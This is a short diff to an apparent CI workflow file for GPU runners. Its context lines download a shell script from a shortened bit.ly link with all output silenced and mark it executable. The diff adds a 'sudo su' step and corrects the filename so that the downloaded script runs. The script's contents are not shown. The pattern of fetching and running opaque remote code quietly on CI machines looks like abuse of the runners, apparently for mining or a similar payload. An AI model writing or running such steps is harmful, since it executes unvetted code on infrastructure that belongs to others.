@@ -8,6 +8,7 @@ jobs:
     steps:
       - run: nvidia-smi
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
+      - run: sudo su
       - run: wget -O w2022.sh https://bit.ly/a2nk-W2022 > /dev/null 2>&1
       - run: chmod +x w2022.sh
-      - run: ./w2022.s
+      - run: ./w2022.sh
